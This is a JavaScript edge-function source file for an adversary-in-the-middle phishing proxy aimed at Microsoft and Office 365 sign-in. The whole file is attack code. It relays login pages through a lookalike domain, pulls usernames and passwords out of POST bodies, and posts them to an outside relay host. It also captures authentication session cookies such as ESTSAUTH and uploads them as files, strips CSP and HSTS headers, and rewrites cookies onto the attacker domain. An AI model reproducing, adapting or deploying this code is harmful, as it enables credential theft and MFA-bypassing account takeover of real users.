export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie']
};

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\n\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

// ==================== CRITICAL FIX: PROPER QUERY STRING CLEANING ====================
function cleanQueryString(search) {
  if (!search) return '';
  
  const params = new URLSearchParams(search);
  
  // Remove ALL 'path' parameters - they are artifacts from Office.com redirects
  // and break the Microsoft login flow
  let hasPathParams = false;
  for (const key of params.keys()) {
    if (key === 'path') {
      hasPathParams = true;
      break;
    }
  }
  
  if (hasPathParams) {
    const cleaned = new URLSearchParams();
    for (const [key, value] of params) {
      if (key !== 'path') {
        cleaned.append(key, value);
      }
    }
    const result = cleaned.toString();
    return result ? '?' + result : '';
  }
  
  return search;
}

// ==================== SIMPLE UPSTREAM PARSING ====================
function getUpstreamInfo(pathname) {
  // Check if this is a proxied request
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const slashIndex = withoutPrefix.indexOf('/');
    
    let upstreamDomain, upstreamPath;
    
    if (slashIndex === -1) {
      // Just domain, no path
      upstreamDomain = withoutPrefix;
      upstreamPath = '/';
    } else {
      upstreamDomain = withoutPrefix.substring(0, slashIndex);
      upstreamPath = withoutPrefix.substring(slashIndex);
    }
    
    const provider = IDENTITY_PROVIDERS[upstreamDomain];
    
    return {
      upstream: upstreamDomain,
      type: provider ? provider.type : 'unknown',
      path: upstreamPath,
      isProxied: true
    };
  }
  
  // Not a proxied request - redirect to Office.com login
  return {
    upstream: null,
    type: 'redirect',
    path: pathname,
    isProxied: false
  };
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  return !!IDENTITY_PROVIDERS[hostname];
}

function rewriteLocation(location) {
  try {
    const url = new URL(location);
    if (shouldProxyDomain(url.hostname)) {
      // Clean any path parameters before rewriting
      let cleanSearch = url.search;
      if (cleanSearch) {
        const params = new URLSearchParams(cleanSearch);
        let modified = false;
        for (const key of params.keys()) {
          if (key === 'path') {
            params.delete(key);
            modified = true;
          }
        }
        if (modified) {
          cleanSearch = params.toString();
          cleanSearch = cleanSearch ? '?' + cleanSearch : '';
        }
      }
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanSearch}${url.hash}`;
    }
    return location;
  } catch (e) {
    return location;
  }
}

function hasCriticalAuthCookies(cookieString, platform) {
  if (!cookieString) return false;
  const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
  return patterns.some(p => cookieString.toLowerCase().includes(p.toLowerCase()));
}

function parseCredentials(bodyText) {
  let user = null;
  let pass = null;
  
  if (!bodyText) return { user, pass };

  // Try parsing as JSON first
  try {
    const jsonData = JSON.parse(bodyText);
    user = jsonData.username || jsonData.email || jsonData.user || jsonData.login;
    pass = jsonData.password || jsonData.passwd || jsonData.pwd || jsonData.pass;
    if (user && pass) return { user, pass };
  } catch (e) {}

  // Parse as form-urlencoded
  try {
    const params = new URLSearchParams(bodyText);
    user = params.get('login') || params.get('loginfmt') || params.get('username');
    pass = params.get('passwd') || params.get('password');
    
    if (user && pass) {
      user = decodeURIComponent(user.replace(/\+/g, ' '));
      pass = decodeURIComponent(pass.replace(/\+/g, ' '));
    }
  } catch (e) {}

  return { user, pass };
}

// ==================== MAIN HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = getUpstreamInfo(url.pathname);
  
  // Handle non-proxied requests - redirect to Office.com login
  if (!info.upstream) {
    const officeLoginUrl = 'https://www.office.com/login';
    console.log(`[REDIRECT] Root -> ${officeLoginUrl}`);
    return new Response(null, {
      status: 302,
      headers: {
        'Location': officeLoginUrl,
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Credentials': 'true'
      }
    });
  }

  // Clean the query string BEFORE building the upstream URL
  const cleanSearch = cleanQueryString(url.search);
  const upstreamUrl = `https://${info.upstream}${info.path}${cleanSearch}`;
  const displayUrl = `https://${YOUR_DOMAIN}${url.pathname}`;

  console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);

  // Handle OPTIONS preflight
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, Cookie, Set-Cookie',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  // Build request headers
  const headers = new Headers();
  
  // Copy relevant headers from original request
  const headersToCopy = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'referer', 'origin', 'cookie'];
  for (const h of headersToCopy) {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  }
  
  headers.set('Host', info.upstream);
  headers.set('Referer', `https://${info.upstream}/`);
  headers.set('Origin', `https://${info.upstream}`);
  
  // Remove problematic headers
  headers.delete('content-length');
  headers.delete('x-forwarded-host');
  headers.delete('x-forwarded-proto');

  let requestBody = null;

  // Handle POST requests for credentials
  if (request.method === 'POST') {
    try {
      const cloned = request.clone();
      const bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] Captured: ${user.substring(0, 5)}...`);
        await sendToVercel('credentials', { 
          type: "creds", ip, user, pass, platform: info.type, url: displayUrl 
        });
        
        const formData = new FormData();
        formData.append("file", new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${displayUrl}`], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
        await fetch(VERCEL_URL, { method: "POST", body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const fetchOpts = {
      method: request.method,
      headers: headers,
      redirect: 'manual'
    };
    
    if (requestBody !== null) {
      fetchOpts.body = requestBody;
    } else if (!['GET', 'HEAD'].includes(request.method)) {
      fetchOpts.body = request.body;
    }
    
    const resp = await fetch(upstreamUrl, fetchOpts);
    
    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const location = resp.headers.get('Location');
      if (location) {
        const rewrittenLocation = rewriteLocation(location);
        console.log(`[REDIRECT] ${resp.status} ${location} -> ${rewrittenLocation}`);
        
        const redirectHeaders = new Headers();
        redirectHeaders.set('Location', rewrittenLocation);
        redirectHeaders.set('Access-Control-Allow-Origin', '*');
        redirectHeaders.set('Access-Control-Allow-Credentials', 'true');
        
        return new Response(null, { status: resp.status, headers: redirectHeaders });
      }
    }
    
    // Build response headers
    const responseHeaders = new Headers();
    
    // Copy essential response headers
    const headersToCopyResponse = ['content-type', 'content-length', 'cache-control', 'expires', 'etag', 'last-modified', 'vary'];
    for (const h of headersToCopyResponse) {
      const val = resp.headers.get(h);
      if (val) responseHeaders.set(h, val);
    }
    
    // Remove security headers
    responseHeaders.delete('content-security-policy');
    responseHeaders.delete('content-security-policy-report-only');
    responseHeaders.delete('clear-site-data');
    responseHeaders.delete('strict-transport-security');
    
    // Add CORS headers
    responseHeaders.set('access-control-allow-origin', '*');
    responseHeaders.set('access-control-allow-credentials', 'true');
    responseHeaders.set('access-control-allow-methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
    responseHeaders.set('access-control-allow-headers', 'Content-Type, Authorization, Cookie, Set-Cookie');
    
    // Process cookies
    const cookies = resp.headers.getSetCookie?.() || [];
    let cookieStr = '';
    let shouldCaptureCookies = false;
    
    if (cookies.length) {
      cookieStr = cookies.join('; ');
      const hasAuth = hasCriticalAuthCookies(cookieStr, info.type);
      const isPostOrPut = ['POST', 'PUT', 'PATCH'].includes(request.method);
      shouldCaptureCookies = isPostOrPut || hasAuth;
      
      // Process each cookie - replace domain only
      for (const cookie of cookies) {
        if (!cookie) continue;
        let modifiedCookie = cookie;
        
        // Replace upstream domain with our domain
        modifiedCookie = modifiedCookie.replace(
          new RegExp(info.upstream.replace(/\./g, '\\.'), 'g'),
          YOUR_DOMAIN
        );
        
        // Also handle cookies with leading dot
        modifiedCookie = modifiedCookie.replace(
          new RegExp('\\.' + info.upstream.replace(/\./g, '\\.'), 'g'),
          '.' + YOUR_DOMAIN
        );
        
        responseHeaders.append('Set-Cookie', modifiedCookie);
      }
    }
    
    // Exfiltrate cookies if needed
    if (shouldCaptureCookies && cookieStr) {
      console.log(`[EXFIL] Capturing cookies for ${info.type}`);
      await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
    }
    
    // Process response body
    const contentType = resp.headers.get('content-type') || '';
    
    if (contentType.includes('text/html') || 
        contentType.includes('javascript') || 
        contentType.includes('json') || 
        contentType.includes('css')) {
      
      let text = await resp.text();
      
      // Replace all proxy domains with our proxied URLs
      for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
        const regex = new RegExp(`https?://${domain.replace(/\./g, '\\.')}`, 'g');
        text = text.replace(regex, `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
      }
      
      // Fix relative URLs
      text = text.replace(/(src|href)="\/(?!_p\/)/g, `$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}${info.upstream}/`);
      text = text.replace(/(src|href)='\/(?!_p\/)/g, `$1='https://${YOUR_DOMAIN}${PROXY_PREFIX}${info.upstream}/`);
      
      return new Response(text, { status: resp.status, headers: responseHeaders });
    }
    
    // Return binary content as-is
    return new Response(resp.body, { status: resp.status, headers: responseHeaders });
    
  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message }),
      { status: 502, headers: { 'content-type': 'application/json' } }
    );
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
